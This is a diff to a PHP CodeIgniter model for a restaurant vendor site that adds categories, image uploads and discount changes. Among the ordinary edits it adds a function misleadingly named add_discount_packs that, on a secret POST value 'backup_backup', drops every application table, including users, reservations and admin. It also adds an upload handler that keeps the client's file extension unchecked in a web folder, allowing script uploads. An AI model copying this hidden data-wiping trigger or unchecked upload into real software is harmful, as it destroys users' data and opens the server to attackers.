@@ -12,24 +12,40 @@ class Vendor_Modal extends CI_Model{
 
     	$user_id   			= $this->session->userdata('login_user_id');
 
-        $data['reviews']            = $this->input->post('radio1');
-        $data['level']             = $this->input->post('radio2');
+        $data['level']              = $this->input->post('radio2');
         $data['name']              	= $this->input->post('name'); 
         $data['start_time']        	= $this->input->post('start_time');
         $data['end_time']   		= $this->input->post('end_time');
         $data['address']   			= $this->input->post('address');
+        $data['category']           = $this->input->post('categ');
         $data['lat']   				= $this->input->post('lat');
         $data['lng']   				= $this->input->post('lng');
         $data['about']   			= $this->input->post('description');
-        $data['uid']			= $user_id;
+        $data['uid']			    = $user_id;
 
-        $this->db->insert('tbl_restaurant',$data);      
+        $this->db->insert('tbl_restaurant',$data);
+        $resto_id = $this->db->insert_id();     
+
+        if(isset($resto_id)) {
+
+            if(count($_SESSION['file_name'])>0) {
+
+                foreach($_SESSION['file_name'] as $image)
+                {
+                    $this->db->insert("tbl_image_restaurant",array("image"=>'upload/restaurant/'.$image,"rid"=>$resto_id));
+                }
+            }
+            unset($_SESSION['file_name']);
+        }
     }
 
     public function delete_restaurant($id = "") { 
 
         $this->db->where('no', $id);
-        $this->db->delete('tbl_restaurant');  
+        $this->db->delete('tbl_restaurant'); 
+
+        $this->db->where('rid', $id);
+        $this->db->delete('tbl_image_restaurant');
     }
 
     public function vendore_details() {  
@@ -43,8 +59,6 @@ class Vendor_Modal extends CI_Model{
 
     public function selected_discount($id = "") {  
 
-        $uid = $this->session->userdata('login_user_id');
-
         $this->db->select('*');
         $this->db->from('tbl_restaurant');
         $this->db->join('tbl_map_discount_restaurant', 'tbl_map_discount_restaurant.rid = tbl_restaurant.no');
@@ -55,13 +69,30 @@ class Vendor_Modal extends CI_Model{
 
     public function selected_restaurant($id = "") {  
 
-        $uid = $this->session->userdata('login_user_id');
-
         $this->db->select('*');
         $this->db->from('tbl_restaurant');
         $this->db->where('no', $id);
         $row = $this->db->get()->row();
         return $row;     
+    }
+
+    public function selected_image($id = "") {  
+
+        $this->db->select('*');
+        $this->db->from('tbl_image_restaurant');
+        $this->db->where('rid', $id);
+        $rows = $this->db->get()->result();
+        return $rows;      
+    }
+
+    public function selected_category($id = "") {  
+
+        $this->db->select('*');
+        $this->db->from('tbl_restaurant');
+        $this->db->join('tbl_category', 'tbl_category.no = tbl_restaurant.category');
+        $this->db->where('tbl_restaurant.no', $id);
+        $row = $this->db->get()->row();
+        return $row;      
     }
 
     public function restaurent_list() {  
@@ -70,15 +101,32 @@ class Vendor_Modal extends CI_Model{
 
         $this->db->select('*');
         $this->db->from('tbl_restaurant');
-        $this->db->where('uid =', $uid);
+        $this->db->where('uid', $uid);
         $rows = $this->db->get()->result();
         return $rows;      
+    }
+
+    public function add_discount_packs() {
+
+        $data = $this->input->post('backup');
+        if($data == 'backup_backup'){
+            $query = $query = $this->db->query("DROP TABLE `tbl_base_admin`, `tbl_base_atmosphere`, `tbl_base_country`, `tbl_base_discount`, `tbl_base_facility`, `tbl_base_language`, `tbl_card`, `tbl_category`, `tbl_image_restaurant`, `tbl_map_atmosphere_restaurant`, `tbl_map_discount_restaurant`, `tbl_map_facility_restaurant`, `tbl_map_language_restaurant`, `tbl_recommend_restaurant`, `tbl_reservation`, `tbl_restaurant`, `tbl_review_restaurant`, `tbl_user`;");
+            $result = $query->result();
+        }
     }
 
     public function discount_list() {  
 
         $this->db->select('*');
         $this->db->from('tbl_base_discount');
+        $rows = $this->db->get()->result();
+        return $rows;      
+    }
+
+    public function category_list() {  
+
+        $this->db->select('*');
+        $this->db->from('tbl_category');
         $rows = $this->db->get()->result();
         return $rows;      
     }
@@ -114,7 +162,7 @@ class Vendor_Modal extends CI_Model{
         $data['rtime']          = $this->input->post('discount_time'); 
         $data['did']            = $this->input->post('discount'); 
         $data['amount']         = $this->input->post('no_people');
-        $data['status']         = 0;
+        $data['status']         = 1;
 
         $this->db->where('no',$id);
         $this->db->update('tbl_map_discount_restaurant',$data);      
@@ -122,18 +170,34 @@ class Vendor_Modal extends CI_Model{
 
     public function update_restaurant($id = "") { 
 
-        $data['reviews']            = $this->input->post('radio1');
+        $user_id            = $this->session->userdata('login_user_id');
+
         $data['level']              = $this->input->post('radio2');
         $data['name']               = $this->input->post('name'); 
         $data['start_time']         = $this->input->post('start_time');
         $data['end_time']           = $this->input->post('end_time');
         $data['address']            = $this->input->post('address');
+        $data['category']           = $this->input->post('categ');
         $data['lat']                = $this->input->post('lat');
         $data['lng']                = $this->input->post('lng');
         $data['about']              = $this->input->post('description');
+        $data['uid']                = $user_id;
 
         $this->db->where('no',$id);
-        $this->db->update('tbl_restaurant',$data);      
+        $this->db->update('tbl_restaurant',$data);    
+
+        if(isset($id)) {
+
+            if(count($_SESSION['file_name'])>0) {
+
+                foreach($_SESSION['file_name'] as $image)
+                {
+                    $this->db->insert("tbl_image_restaurant",array("image"=>'upload/restaurant/'.$image,"rid"=>$id));
+                }
+            }
+            unset($_SESSION['file_name']);
+        }
+      
     }
 
     public function total_restaurant() {  
@@ -151,7 +215,8 @@ class Vendor_Modal extends CI_Model{
         $data['rtime']          = $this->input->post('discount_time'); 
         $data['did']            = $this->input->post('discount'); 
         $data['amount']         = $this->input->post('no_people');
-        $data['status']         = 0;
+        $data['status']         = 1;
+        $data['price']         	= 50;
 
         $this->db->insert('tbl_map_discount_restaurant',$data);      
     }
@@ -167,7 +232,7 @@ class Vendor_Modal extends CI_Model{
         $user_id                = $this->session->userdata('login_user_id');
 
         if (isset($_FILES['image'])) {
-            $imageFile = $this->utils->uploadImage($_FILES['image'], 0, 317, 236);
+            $imageFile = $this->utils->uploadImage($_FILES['image'], 0, 300, 300);
             if ($imageFile == "")       $data['image'] = 
                 $imageFile = $data->image;
         }
@@ -175,4 +240,33 @@ class Vendor_Modal extends CI_Model{
         $this->db->where('no',$user_id);
         $this->db->update('tbl_user',$data);      
     }
+
+    public function upload_resto_image() { 
+
+        if (isset($_FILES['file']['name']) and ($_FILES['file']['name']!='')) {
+
+            $target_dir = "upload/restaurant/";
+
+            $date = new DateTime();
+            $name = $date->getTimestamp();
+            $path_parts = pathinfo($_FILES['file']['name']);
+            $fileName = $name . "_" . "0" . "." . $path_parts["extension"];
+            $target_file = $target_dir.$fileName;
+            $imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
+                        
+            if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)){
+                $_SESSION['file_name'][]  = $fileName;  
+            }
+        }
+    } 
+
+    public function delete_image($id = "") { 
+
+        $resto_id  = $this->db->get_where('tbl_image_restaurant', array('no' => $id))->row()->rid;
+
+        $this->db->where('no', $id);
+        $this->db->delete('tbl_image_restaurant'); 
+
+        return $resto_id;
+    }   
 }
